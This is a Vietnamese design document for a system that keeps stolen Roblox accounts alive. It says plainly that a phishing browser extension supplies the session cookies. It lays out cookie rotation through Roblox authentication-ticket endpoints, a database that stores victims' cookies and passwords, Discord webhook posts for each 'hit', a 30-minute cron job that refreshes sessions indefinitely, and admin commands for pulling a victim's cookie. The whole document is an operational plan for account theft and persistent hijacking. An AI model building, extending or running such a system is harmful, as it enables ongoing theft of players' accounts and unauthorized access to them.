# Hệ thống Duy trì Tài khoản (Account Nurturing) - Chi tiết toàn bộ Logic

## 🎯 Tổng quan

Hệ thống này duy trì các tài khoản Roblox bị đánh cắp ở trạng thái "sống" bằng cách tự động làm mới cookie định kỳ. Cookie Roblox có hiệu lực 5-7 giờ → nếu không làm mới sẽ hết hạn → acc chết.

---

## 🎯 **Luồng chính: Từ lấy cookie đến duy trì tài khoản**

### **1️⃣ Lấy Cookie từ Extension (Input)**
```
Extension Phishing → Gửi .ROBLOSECURITY cookie 
                  → POST /api/sessions
                  → Backend nhận
```

---

### **2️⃣ Làm mới Cookie (Rotation Process)**

Đây là bước **TÂM CỴ** - tạo ra cookie hợp lệ mới từ cookie cũ:

```
Step A: Gửi cookie cũ tới Roblox Auth
  └─ POST https://auth.roblox.com/v1/authentication-ticket
  └─ Header: Cookie: .ROBLOSECURITY=<cookie_cũ>

Step B: Lấy x-csrf-token từ response
  └─ Roblox trả về `x-csrf-token` trong header

Step C: Gửi lại request với token này
  └─ POST https://auth.roblox.com/v1/authentication-ticket
  └─ Header: x-csrf-token=<token từ B>
  └─ Nhận `rbx-authentication-ticket` từ response

Step D: Đổi ticket thành cookie mới
  └─ POST https://auth.roblox.com/v1/authentication-ticket/redeem
  └─ Body: rbxAuthenticationTicket=<ticket từ C>
  └─ Roblox response: Set-Cookie: .ROBLOSECURITY=<cookie_MỚI>

✅ RESULT: Cookie mới được tạo ra
```

**Tại sao cần làm mới?** 
- Cookie Roblox có thời gian sống hạn chế (5-7 giờ)
- Nếu không làm mới sẽ hết hạn → mất quyền truy cập acc
- Làm mới cookie = kéo dài thời gian sử dụng tài khoản

---

### **3️⃣ Lưu vào Database (UPSERT)**

Sau khi có cookie mới, backend thực hiện **UPSERT** (Update hoặc Insert):

```
Nếu userId chưa tồn tại trong DB:
  └─ CREATE new record:
     ├─ userId (từ auth Roblox)
     ├─ cookie (cookie mới)
     ├─ status = "ALIVE"  ← Trạng thái hoạt động
     ├─ username (nếu có)
     ├─ password (nếu có)
     ├─ userAgent (nếu có)
     ├─ messageId (Discord webhook message ID)
     └─ updatedAt = NOW()

Nếu userId đã tồn tại:
  └─ UPDATE record:
     ├─ cookie ← cookie mới (ghi đè)
     ├─ status = "ALIVE"
     └─ updatedAt = NOW()  ← Update thời gian
```

**Tại sao UPSERT?**
- Tránh tạo trùng bản ghi cùng tài khoản
- Đảm bảo dữ liệu sạch (1 userId = 1 bản ghi)
- Luôn có thông tin mới nhất

---

### **4️⃣ Gửi Webhook sang Discord (Notification)**

```
Backend gửi embed message tới Discord webhook:
┌──────────────────────────────────┐
│ 🎯 NEW HIT hoặc HIT UPDATE      │
│ ─────────────────────────────    │
│ UserId: 123456789                │
│ Username: PlayerName             │
│ Status: ALIVE                    │
│ Cookie: .ROBLOSECURITY=abc123..  │
│ Password: (nếu có)               │
│ UserAgent: Mozilla/5.0...        │
└──────────────────────────────────┘

Nếu là HIT mới:
  └─ Gửi message mới với thông tin acc

Nếu là cập nhật:
  └─ Edit message cũ (dùng messageId)
```

**Mục đích:**
- Admin biết ngay có acc mới
- Tracking/monitoring tập trung
- Có thể quản lý và sử dụng acc

---

## 🔄 **Phần cốt lõi: Duy trì Session (Cron Job)**

Đây là phần **giữ cho acc không chết**:

### **Lịch trình tự động (Mỗi 30 phút)**

```
Cron Pattern: */30 * * * *  
  └─ Chạy lúc :00 và :30 của mỗi giờ
  └─ VD: 15:00, 15:30, 16:00, 16:30...

Mỗi lần chạy:
├─ Query DB: Tìm tất cả session với điều kiện:
│  ├─ status = "ALIVE"  (chỉ acc đang hoạt động)
│  └─ updatedAt < (NOW - 5 giờ)  (acc cũ)
│
├─ Ví dụ: Nếu NOW = 15:30
│         Thì tìm session có updatedAt < 10:30
│         (những acc chưa được update từ 5 giờ trước)
│
└─ Kết quả: Lấy danh sách tất cả acc cần "nuôi lại"
```

**Tại sao 5 giờ?**
- Cookie Roblox có hiệu lực khoảng 5-7 giờ
- Phải làm mới TRƯỚC khi hết hạn (không nên đợi tới giây cuối)
- 5 giờ = margin an toàn để tránh acc bị chết đột ngột

---

### **Làm mới toàn bộ danh sách (Batch Refresh)**

```
Với mỗi session tìm được:
  ├─ Lấy cookie cũ từ DB
  ├─ Thực hiện lại quy trình Rotation (steps A-D ở trên)
  │
  ├─ NẾU THÀNH CÔNG:
  │  ├─ Ghi cookie mới vào DB
  │  ├─ Cập nhật updatedAt = NOW()
  │  ├─ Status = "ALIVE"
  │  └─ Update webhook message (nếu có)
  │
  └─ NẾU THẤT BẠI:
     ├─ Lý do: Không có token / Cookie sai / Acc bị locked
     ├─ Cập nhật status = "DIE"  ← Acc chết
     └─ Có thể gửi webhook báo lỗi
```

**Chống chạy chồng:**
- Hệ thống có cơ chế lock để tránh 2 cron job chạy cùng lúc
- Ngăn refresh trùng → tránh conflict dữ liệu
- Đảm bảo tính nhất quán của quá trình

---

## 📊 **Bảng trạng thái Account (Status)**

```
┌────────┬──────────────────────────────────────────────────────┐
│ STATUS │ Ý NGHĨA & HÀNH ĐỘNG                                 │
├────────┼──────────────────────────────────────────────────────┤
│ ALIVE  │ Acc hoạt động, cookie còn hợp lệ                    │
│        │ → Sẽ được cron job chọn để làm mới mỗi 30 phút      │
│        │ → Có thể sử dụng được bất cứ lúc nào                │
├────────┼──────────────────────────────────────────────────────┤
│ PAUSED │ Admin tạm dừng (tạm không làm mới)                  │
│        │ → Cron job sẽ bỏ qua, không refresh                 │
│        │ → Dùng khi cần "giấu" acc tạm thời                 │
├────────┼──────────────────────────────────────────────────────┤
│ DIE    │ Cookie không còn hợp lệ (hết hạn / sai / locked)   │
│        │ → Cron job bỏ qua                                    │
│        │ → Acc không thể sử dụng được nữa                    │
│        │ → Có thể cần lấy cookie mới từ extension            │
└────────┴──────────────────────────────────────────────────────┘
```

---

## 🎮 **Vận hành qua Discord Commands**

Admin có thể can thiệp thủ công qua slash commands:

```
/ping               → Kiểm tra bot còn hoạt động không

/refresh            → Kích hoạt cron job ngay lập tức
                      (không chờ 30 phút tiếp theo)

/alive              → Xem số lượng acc ALIVE hiện tại
                      VD: "Có 156 acc đang hoạt động"

/all                → Liệt kê tất cả acc (tất cả status)

/cookie <userId>    → Lấy cookie của acc tính theo userId
                      (để sử dụng hoặc backup)

/update <userId>    → Cập nhật status / cookie / auth
                      VD: Chuyển từ ALIVE → PAUSED

/delete <userId>    → Xóa acc khỏi DB (xóa vĩnh viễn)

/log                → Xem log gần nhất (lỗi, cảnh báo...)

/clear              → Xóa nhanh tin nhắn trong kênh
                      (khi có đủ quyền)
```

---

## ⚙️ **Toàn bộ Vòng lặp Hoạt động**

```
TIMELINE:

T=0: Extension gửi cookie từ acc Roblox bị đánh cắp
     └─ POST /api/sessions
     └─ Backend nhận cookie

T=1-3s: Rotate cookie (làm mới)
     ├─ A→B→C→D: Tạo cookie mới từ Roblox API
     ├─ UPSERT vào DB với status=ALIVE
     ├─ Gửi webhook Discord báo "NEW HIT"
     └─ updatedAt = 15:00

15:00-20:00: Acc hoạt động bình thường
     └─ Người dùng có thể sử dụng cookie này
     └─ Nhưng cookie sẽ dần hết hạn (5-7 giờ)

20:30: Cron job chạy (30 phút = T+11.5 giờ)
     ├─ Query: Tìm acc ALIVE có updatedAt < 15:30
     ├─ Tìm thấy acc từ 15:00 (đã > 5 giờ)
     └─ Chọn vào danh sách refresh

20:30-20:35: Batch refresh
     ├─ Lấy cookie cũ từ DB
     ├─ Rotate cookie (làm mới) → cookie MỚI
     ├─ Update DB: cookie ← cookie MỚI, updatedAt = 20:30
     └─ Update webhook Discord với cookie mới

Kết quả sau refresh:
     ├─ Cookie cũ (từ 15:00) → hết hạn vào ~22:00
     ├─ Cookie mới (từ 20:30) → hết hạn vào ~01:30 (ngày hôm sau)
     └─ Acc còn sử dụng được thêm 5-7 giờ nữa!

LOOP: Cứ mỗi 30 phút cron chạy 1 lần:
     ├─ 21:00: Acc từ 20:30 chưa cần refresh (< 5 giờ)
     ├─ 21:30: Acc từ 20:30 chưa cần refresh (< 5 giờ)
     ├─ ...
     ├─ 01:30: Acc từ 20:30 cần refresh (> 5 giờ)
     ├─ Làm mới lần nữa
     └─ Vòng lặp tiếp tục vô hạn...

🎯 NHÂN TỐ LÀM ACC "SỐNG MÃI":
     Cứ đến thời gian nhất định (mỗi 5 giờ) cookie tự động được làm mới
     → Không lo cookie hết hạn
     → updatedAt luôn được reset
     → Acc luôn có trạng thái ALIVE
     → Cookie login luôn khả dụng (đko)
     → Quá trình duy trì vô hạn miễn là DB còn lưu bản ghi
```

---

## 🔐 **Vấn đề Bảo mật**

```
⚠️  Cookie được gửi qua Discord webhook
    → Cần kiểm soát quyền truy cập kênh Discord chặt chẽ
    → Chỉ admin đáng tin cậy mới được xem

⚠️  Password được lưu trong DB
    → Nên mã hóa trước khi lưu

⚠️  Mọi endpoint API đều yêu cầu x-api-key header
    → Ngăn chặn truy cập trái phép từ người ngoài

⚠️  Quy trình Rotation phụ thuộc vào Roblox API
    → Nếu Roblox thay đổi API hoặc header
    → Hệ thống có thể bị gián đoạn

✅ Giải pháp:
   - Lưu trữ webhook URL an toàn (env var, không hardcode)
   - Mã hóa cookie/password trong DB
   - Giám sát thường xuyên Roblox API changes
   - Có fallback/error handling
```

---

## 📌 **Tóm tắt Quy trình "Nuôi Acc" - Bảng tóm tắt**

| Bước | Hành động | Mục đích | Tần suất |
|------|----------|---------|---------|
| 1 | Extension gửi cookie | Input acc mới | Mỗi khi có hit |
| 2 | Rotation Cookie (A→B→C→D) | Tạo cookie hợp lệ mới | Mỗi khi có hit |
| 3 | UPSERT vào DB | Lưu trữ centralized | Mỗi khi có hit |
| 4 | Webhook Discord | Tracking/monitoring | Mỗi khi có hit |
| 5 | Cron start (*/30 * * * *) | Bắt đầu quá trình duy trì | Mỗi 30 phút |
| 6 | Query DB (ALIVE, >5h) | Tìm acc cần nourish | Mỗi 30 phút |
| 7 | Batch refresh | Làm mới toàn bộ | Mỗi 30 phút |
| 8 | Update DB + Discord | Cập nhật thông tin mới | Mỗi 30 phút |
| 9 | Loop lại | Duy trì vô hạn | Mỗi 30 phút |

---

## 🎯 **Kết quả cuối cùng**

```
✅ Acc luôn "sống" với cookie hợp lệ
✅ Cookie được làm mới tự động mỗi 5 giờ
✅ Có thể sử dụng bất cứ lúc nào mà không lo hết hạn
✅ Admin có thể can thiệp thủ công qua Discord
✅ Toàn bộ quá trình tự động hóa → giảm thao tác thủ công
```

---

## 📋 **Dữ liệu lưu trữ (Prisma Schema)**

```
Model Session:
  ├─ id (Auto ID)
  ├─ userId (String, Unique)
  ├─ cookie (String) ← Cookie Roblox
  ├─ userAgent (String, optional)
  ├─ status (Enum: ALIVE | PAUSED | DIE)
  ├─ messageId (String, optional) ← Discord webhook message ID
  ├─ createdAt (DateTime)
  └─ updatedAt (DateTime) ← Thời điểm refresh cuối

Model Auth:
  ├─ id (Auto ID)
  ├─ userId (String, FK to Session)
  ├─ username (String)
  ├─ password (String)
  ├─ createdAt (DateTime)
  └─ updatedAt (DateTime)
```

---

**END OF DOCUMENT**
